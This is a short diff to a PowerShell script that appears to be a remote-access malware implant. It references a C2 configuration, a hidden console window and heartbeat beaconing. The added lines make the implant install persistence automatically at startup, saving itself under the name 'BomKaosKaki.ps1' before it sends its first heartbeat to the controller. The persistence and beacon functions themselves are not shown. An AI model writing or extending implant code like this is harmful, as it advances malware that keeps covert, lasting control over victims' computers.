@@ -1779,6 +1779,11 @@ public static extern IntPtr GetConsoleWindow();
     # Create install directory
     if (-not (Test-Path $C2.InstallDir)) { New-Item -ItemType Directory -Path $C2.InstallDir -Force | Out-Null }
     
+    # Auto-Install Persistence
+    $currentPath = $MyInvocation.MyCommand.Path
+    if (-not $currentPath) { $currentPath = Join-Path $C2.InstallDir "BomKaosKaki.ps1" }
+    Install-Persistence -PayloadPath $currentPath | Out-Null
+    
     # Initial heartbeat
     Send-Heartbeat
     
